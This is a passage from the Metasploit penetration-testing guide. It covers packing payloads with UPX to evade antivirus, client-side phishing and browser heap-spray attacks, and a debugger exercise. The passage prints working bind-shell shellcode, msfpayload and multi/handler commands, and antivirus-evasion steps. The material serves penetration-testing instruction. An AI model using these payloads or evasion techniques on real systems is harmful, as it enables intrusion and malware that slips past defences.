class="s25">-k </span>flag. If you embed a payload into a console-based application, when the payload is run, it will display a console window that won’t close until you’re finished using the payload. If you choose a GUI-based application and do not specify the <span class="s25">-k</span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">flag, when the payload is executed, the target will not see a console window. Paying attention to these little details can help you remain stealthy during an engagement.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="434" height="148" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_313.gif"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-top: 9pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark255">Packers</a><a name="bookmark264">&zwnj;</a></p><p class="s29" style="padding-top: 3pt;padding-left: 2pt;text-indent: 0pt;text-align: left;">Figure 7-5: AVG declares the payload safe and the computer secure.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s19" style="padding-left: 2pt;text-indent: 0pt;text-align: left;">Packers <span class="p">are tools that compress an executable and combine it with decom- pression code. When this new executable is run, the decompression code re-creates the original executable from the compressed code before execut- ing it. This usually happens transparently so the compressed executable can be used in exactly the same way as the original. The result of the packing pro- cess is a smaller executable that retains all the functionality of the original.</span></p><p style="padding-left: 2pt;text-indent: 18pt;text-align: left;">As with <span class="s19">msfencode</span>, packers change the structure of an executable. How- ever, unlike the <span class="s19">msfencode </span>encoding process, which often increases the size of an executable, a carefully chosen packer will use various algorithms to both compress and encrypt an executable. Next, we use the popular <span class="s19">UPX </span>packer with Back|Track to compress and encode our <span class="s19">payload3.exe </span>payload in attempt to evade antivirus software detection.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_314.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 13pt;text-align: left;">root@bt:/# <span class="s24">apt-get install upx </span><span class="s30">O</span></p><p class="s24" style="padding-top: 7pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p class="s25" style="padding-top: 7pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">root@bt:/# <span class="s24">upx </span><span class="s30">8</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 37pt;text-indent: -12pt;text-align: left;">Ultimate Packer for eXecutables Copyright (C) 1996 - 2009</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 193%;text-align: left;">UPX 3.04 Markus Oberhumer, Laszlo Molnar &amp; John Reiser Sep 27th 2009 Usage: upx [-123456789dlthVL] [-qvfk] [-o file] file..</p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Type &#39;upx--help&#39; for more detailed help.</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="http://upx.sf.net/" class="s34" target="_blank">UPX comes with ABSOLUTELY NO WARRANTY; for details visit http://upx.sf.net</a></p><p class="s25" style="padding-top: 1pt;padding-left: 36pt;text-indent: 0pt;line-height: 14pt;text-align: left;">root@bt:/# <span class="s24">upx -5 /var/www/payload3.exe </span><span class="s30">@</span></p><p class="s25" style="padding-left: 42pt;text-indent: 0pt;line-height: 9pt;text-align: center;">Ultimate Packer for eXecutables</p><p class="s25" style="padding-left: 41pt;text-indent: 0pt;line-height: 11pt;text-align: center;">Copyright (C) 1996 - 2009</p><p style="text-indent: 0pt;text-align: left;"><span><img width="114" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_315.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="34" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_316.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="63" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_317.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="62" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_318.png"/></span></p><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 193%;text-align: left;">UPX 3.04 Markus Oberhumer, Laszlo Molnar &amp; John Reiser Sep 27th 2009 File size Ratio Format Name</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 13pt;text-align: left;">37888 -&gt; 22528 59.46% <span class="s30">O </span>win32/pe payload3.exe</p><p class="s25" style="padding-top: 7pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">Packed 1 file.</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_319.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 69%;text-align: left;">At <span class="s32">O </span>we install <span class="s19">UPX</span>, and then at <span class="s32">8 </span>we run <span class="s19">UPX </span>with no arguments to view its command line options. Then at <span class="s32">@ </span>we use the <span class="s25">-5 </span>option to compress and pack our executable. You can see at <span class="s32">O </span>that <span class="s19">UPX </span>compresses our payload</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">59.46 percent.</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">In our tests, only 9 of 42 antivirus vendors detected the <span class="s19">UPX</span>-packed binaries.</p><p style="text-indent: 0pt;text-align: left;"><span><img width="437" height="128" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_320.png"/></span></p><p class="s15" style="padding-top: 10pt;padding-left: 131pt;text-indent: 0pt;text-align: center;">MSF VENOM</p><p class="s45" style="padding-top: 11pt;padding-left: 17pt;text-indent: 0pt;line-height: 72%;text-align: left;">In this chapter we cover only the <span class="s47">msfpayload </span>and <span class="s47">msfencode </span>utilities, but there is an additional tool called <span class="s47">msfvenom </span>that combines the functionalities of <span class="s47">msfpayload </span>and <span class="s47">msfencode </span>in a simpler-to-use interface. <span class="s47">Msfvenom </span>is not covered in detail in this book (see Appendix B), but it should be very easy to use after you become familiar with <span class="s47">msfpayload </span>and <span class="s47">msfencode</span>.</p><p style="text-indent: 0pt;text-align: left;"/><p class="s22" style="padding-top: 8pt;padding-left: 90pt;text-indent: -36pt;text-align: justify;">NOTE <a href="http://jon.oberheide.org/files/woot09-polypack.pdf)" class="s20" target="_blank">The PolyPack project </a><a href="http://jon.oberheide.org/files/woot09-polypack.pdf)" class="s31" target="_blank">(http://j</a><span class="p">on.oberheide.org/files/woot09-polypack.pdf) </span><span class="s19">shows the results of packing known malicious binaries with various packers and the effectiveness of antivirus detection before and after the packing process.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark256">A Final Note on Antivirus Software Evasion</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The world of antivirus software moves very quickly, even by Internet stan- dards. As of this writing, the methods and processes documented in this chapter work successfully; however, experience has shown that even a few months can bring major changes in how antivirus evasion is accomplished. Although the Metasploit team is constantly tweaking its payloads and attempts to stay one step ahead of detection algorithms, don’t be surprised if by</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">the time you work through these examples, some work and some do not. When you’re attempting antivirus evasion, consider using multiple packers or encoders, as mentioned, or write your own. Antivirus evasion, like all pen- etration testing skills, needs to be practiced and requires dedicated research to help you ensure success in your engagements.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 231pt;text-indent: 0pt;text-align: left;"><span><img width="69" height="124" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_321.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 9pt;padding-left: 140pt;text-indent: 4pt;line-height: 87%;text-align: left;"><a name="bookmark265">EXPLOITATION USING CLIENT-SIDE ATTACKS </a><a name="bookmark274">&zwnj;</a><a name="bookmark275">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Years of focus on defensive network perimeters have drastically shrunk the traditional attack surfaces. When one avenue of attack becomes too difficult to penetrate, attackers can find new and easier methods for attack- ing their targets. Client-side attacks were the next evo- lution of attacks after network defenses became more</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">prominent. These attacks target software commonly installed on computers in such programs as web browsers, PDF readers, and Microsoft Office appli- cations. Because these programs are commonly installed on computers out of the box, they are obvious attack vectors for hackers. It’s also common for these applications to be out of date on users’ machines because of irregular patching cycles. Metasploit includes a number of built-in client-side exploits, which we’ll cover in depth in this chapter.</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">If you can bypass all the protective countermeasures a company has</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">in place and infiltrate a network by tricking a user into clicking a malicious link, you have a much better chance of achieving a compromise. Suppose, for example, that you are performing a covert penetration test against a corpo- rate target using social engineering. You decide that sending a phishing email</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">to targeted users will present your best chance of success. You harvest email accounts, names, and phone numbers; browse social-networking sites; and create a list of known employees. Your malicious email instructs the email recipients that payroll information needs to be updated; they need to click a link (a malicious link) in the email to do this. However, as soon as the user clicks the link, the machine is compromised, and you can access the organi- zation’s internal network.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">This scenario is a common technique regularly leveraged in both pene- tration tests and actual malicious attacks. It is often easier to attack via users than it is to exploit Internet-facing resources. Most organizations spend a sig- nificant amount of money protecting their Internet-facing systems with tools such as intrusion prevention systems (IPSs) and web application firewalls, while not investing nearly as much in educating their users about social- engineering attacks.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In March 2011, RSA, a well-known security company, was compromised by an attacker leveraging this same process. A malicious attacker sent an extremely targeted (spear-phishing) email that was crafted specifically for an Adobe Flash zero-day vulnerability. (<span class="s19">Spear-phishing </span>is an attack whereby users are heavily researched and targeted rather than randomly chosen from a company address book.) In RSA’s case, the email targeted a small group of users and was able to compromise RSA’s internally connected systems and further penetrate its network.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark266">Browser-Based Exploits</a><a name="bookmark276">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">We’ll focus on browser-based exploits within Metasploit in this chapter. <span class="s19">Browser-based exploits </span>are important techniques, because in many organiza- tions, users spend more time using their web browsers than using any other applications on their computers.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Consider another scenario: We send an email to a small group at an organization with a link that each user will click. The users click the link, and their browsers open to our website, which has been specially crafted to exploit a vulnerability in a certain version of Internet Explorer. The users’ browser application is susceptible to this exploit and is now compromised simply by users visiting our malicious website. On our end, access would be gained via a payload (Meterpreter, for example) running within the context of the user who visited the site.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Note one important element in this example: If the target user were run- ning as an administrator, the attacker (we) would do the same. Client-side exploits traditionally run with the same permissions and rights as the target they exploit. Often this is a regular user without administrative privileges, so we would need to perform a <span class="s19">privilege-escalation attack </span>to obtain additional access, and an additional exploit would be necessary to elevate privileges. We could also potentially attack other systems on the network in hopes of gain- ing administrative-level access. In other cases, however, the current user’s permission levels are enough to achieve the infiltration. Consider your network situation: Is your important data accessible via user accounts? Or is it accessible only to the administrator account?</p><p class="s21" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark267">How Browser-Based Exploits Work</a><a name="bookmark277">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Browser exploits are similar to any traditional exploit but with one major dif- ference: the method used for shellcode delivery. In a traditional exploit, the attacker’s entire goal is to gain remote code execution and deliver a malicious payload. In browser exploits, the most traditional way to gain remote code execution is through an exploitation technique called <span class="s19">heap spraying</span>. But before examining heap spraying in detail, let’s talk about what the <span class="s19">heap </span>is and how it’s used.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">The heap is memory that is unallocated and used by the application as needed for the duration of the program’s runtime. The application will allo- cate whatever memory is necessary to complete whatever task is at hand. The heap is based on how much memory your computer has available and has used through the entire application’s life cycle. The location of memory allocated at runtime is not known in advance, so as attackers, we would not know where to place our shellcode. Hackers can’t simply call a memory address and hope to land at the payload—the randomness of memory allocated by the heap prevents this, and this randomness was a major challenge before heap spraying was discovered.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Before moving on, you also need to understand the concept of a <span class="s19">no- operation instruction (NOP) </span>and <span class="s19">NOP slide</span>. NOPs are covered in detail in Chapter 15, but we’ll cover the basics here because they are important to understanding how heap spraying works. A NOP is an assembly instruction that says, “Do nothing and move to the next instruction.” A NOP slide com- prises multiple NOPs adjacent to each other in memory, basically taking up space. If a program’s execution flow encounters a series of NOP instructions, it will linearly “slide” down to the end of them to the next instruction. A NOP, in the Intel x86 architecture, has an opcode of 90, commonly seen in exploit code as <span class="s25">\x90</span>.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">The heap spraying technique involves filling the heap with a known repeating pattern of NOP slides and your shellcode until you fill the entire memory space with this known value. You’ll recall that memory in the heap is dynamically allocated at program runtime. This is usually done via JavaScript, which causes the browser’s allocated memory to grow significantly. The attacker fills large blocks of memory with NOP slides and shellcode directly after them. When program execution flow is altered and randomly jumps somewhere into memory, there is a good chance of hitting a NOP slide and eventually hitting the shellcode. Instead of looking for a needle in a haystack—that is, the shellcode in memory—heap spraying offers an 85 to 90 percent chance of the exploit being successful.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">This technique changed the game in browser exploitation and in the reliability of exploiting browser bugs. We will not be covering the actual code behind heap spraying, because it’s an advanced exploitation topic, but you should know the basics so that you can understand how these browser-based exploits work. Before we begin launching our first browser exploit, let’s look at what actually happens behind the scenes when an exploit is launched.</p><p class="s21" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark268">Looking at NOPs</a><a name="bookmark278">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Now that you understand the basics of a heap spray and a NOP, let’s take a look at a generic NOP slide in an actual exploit. In the following listing, notice the hexadecimal representation of <span class="s25">\x90</span>, the Intel x86 architecture opcode. A <span class="s19">90 </span>in Intel x86 assembly is a NOP. Here you see a series of <span class="s25">\x90</span>s that create our NOP-slide effect. The rest of the code is the payload, such as a reverse shell or a Meterpreter shell.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_322.png"/></span></p><p class="s24" style="padding-left: 23pt;text-indent: 0pt;text-align: center;">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</p><p class="s24" style="padding-left: 23pt;text-indent: 0pt;text-align: center;">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</p><p class="s24" style="padding-left: 23pt;text-indent: 0pt;line-height: 10pt;text-align: center;">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x31</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">\xdb\x53\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\xc2</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">\xdb\x37\x67\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff\xd5\x53</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">\x53\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97\x68\x75\x6e\x4d</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">\x61\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_323.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark269">Using Immunity Debugger to Decipher NOP Shellcode</a><a name="bookmark279">&zwnj;</a></p><p class="s19" style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Debuggers <span class="p">offer a window into the running state of a program, including assembly instruction flow, memory contents, and exception details. Penetra- tion testers leverage debuggers on a regular basis to identify zero-day vulner- abilities and to understand how an application works and how to attack it. A number of debuggers are out there, but our personal preference going forward (and used in later chapters) is Immunity Debugger. We recommend that you take a look at the basics of Immunity Debugger before proceeding.</span></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">To understand what a NOP slide does, let’s use a debugger to look at how the NOP shellcode in the preceding example works. On your Windows XP target, download and install Immunity Debugger from <span class="s19">http://www.immunityinc</span></p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><span class="s19">.com/</span>. We’ll use the <span class="s25">msfpayload </span>command to generate sample shellcode for a simple TCP bind shell, listening on port 443. As you learned in previous</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">chapters, a bind shell simply listens on a port on a target machine to which we can connect.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_324.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">root@bt:/opt/framework3/msf3# <span class="s24">msfpayload windows/shell/bind_tcp LPORT=443 C</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_325.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">When these commands are executed, “stage 1” and “stage 2” shellcodes are created in the output. We are concerned only with the stage 1 shellcode, because Metasploit will handle sending the second stage for us when we con- nect to it. Copy and paste the shellcode from stage 1 into a text editor of your choice. You’ll need to do some minor editing before proceeding.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Now that you have your basic shellcode, add as many NOPs as you want to the beginning of it (such as <span class="s25">\x90\x90\x90\x90\x90</span>). Then remove all <span class="s25">\x </span>occurrences so it looks similar to the following:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_326.png"/></span></p><p class="s25" style="padding-top: 1pt;padding-left: 36pt;text-indent: 0pt;line-height: 87%;text-align: justify;">909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090f ce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f0 52578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe058</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">5f5a8b12eb865d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 87%;text-align: left;">050405068ea0fdfe0ffd59731db5368020001bb89e66a10565768c2db3767ffd5535768b7e938ffffd553535768 74ec3be1ffd5579768756e4d61ffd56a006a0456576802d9c85fffd58b366a406800100000566a006858a453e5f</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">fd593536a005653576802d9c85fffd501c329c685f675<span class="s24">ecc3</span></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_327.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">All this is necessary because you need to use a particular format so that Immunity Debugger will accept your copy-and-paste of assembly instructions. Now you have a bind shell with some NOPs in front of it for testing. Next, open up any executable—let’s use <span class="s19">iexplore.exe </span>for this example. Open Immu- nity Debugger, choose <span class="s18">File</span><span class="s49">►</span><span class="s18">Open</span>, and point to an executable. You should see a number of assembly instructions in the main window (the largest one). Left-click the first instruction on the screen, and hold down <span class="s9">SHIFT </span>while left- clicking to highlight about 300 instructions below it.</p><p class="s18" style="padding-left: 90pt;text-indent: 18pt;text-align: left;"><span class="p">Copy the shellcode to the clipboard, and right-click in the Immunity Debugger window and choose </span>Binary<span class="s49">►</span>Binary paste<span class="p">. This will paste the assembly instructions from the example into the Immunity Debugger window. (Remember that we are doing this to identify how NOPs work and how assembly instructions are executed.)</span></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">You can see in Figure 8-1 that a number of NOPs are inserted; if you were to scroll down, you would see your shellcode.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">When we first exported our shellcode in a <span class="s25">bind_tcp </span>format, the last instruc- tion through stage 1 ended with <span class="s25">ecc3</span>. Locate the last set of memory instructions we added ending in <span class="s25">ecc3</span>.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Right after the <span class="s25">ecc3</span>, press F2 to create a breakpoint. When you add a breakpoint, once execution flow encounters it, program execution will pause and will not continue. This is important here, because the code still has a lot of the old remnants of the application we opened, and continuing would cause the application to crash, because we already inserted our own code into it. We want to stop and investigate what happened before the applica- tion crashes.</p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="443" height="300" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_328.gif"/></span></p><p class="s29" style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 8-1: Examples of multiple NOPs that create the NOP slide</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">In the example in Figure 8-2, notice the last instruction set, which is a <span class="s25">C3</span>.</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">That is the last instruction set in our bind shell that we need.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">After that <span class="s25">C3</span>, press F2, which sets up another breakpoint. Now we’re ready to roll and see what happens. Go back to the very top, where you added your NOPs, and press F7, which tells the debugger to execute the next assembly command, stepping into your next assembly instruction. Notice that the highlight moves down one line. Nothing happened because you added a NOP.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Next, press F7 a few times to walk down the NOP slide. When you first arrive at the memory instructions, open up a command prompt and type <span class="s24">netstat -an</span>. Nothing should be listening on 443, and this is a good sign that your payload hasn’t executed yet.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">Press F5 to continue running the rest of the application until it reaches the breakpoint that you set. You should see the breakpoint indicated in the lower-left corner of the Immunity Debugger window. At this point, you have executed your payload within the debugger, and you should now be able to check <span class="s25">netstat -an </span>and notice port 443 listening.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">On a remote machine, try to telnet to the target machine on port 443. You’ll notice that nothing happens; this is because the listener hasn’t received the sec- ond stage from Metasploit yet. On your Back|Track VM, go into Metasploit and set up a multi-handler. This will tell Metasploit that a first-stage listener is on port 443 on the target machine.</p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="442" height="410" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_329.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 8-2: The last part of our instruction set that we need</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_330.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use  multi/handler</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">set  payload  windows/shell/bind_tcp</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">payload =&gt; windows/shell/bind_tcp msf exploit(handler) &gt; <span class="s24">set LPORT 443 </span>LPORT =&gt; 443</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">set RHOST 192.168.33.130</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOST =&gt; 192.168.33.130</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">exploit</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Starting the payload handler... [*] Started bind handler</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Sending stage (240 bytes)</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Command shell session 1 opened (192.168.33.129:60463 -&gt; 192.168.33.130:443)</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_331.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">You have reached a basic command shell! As a good practicing technique, try a stage 1 Meterpreter reverse and see if you can get a connection. When 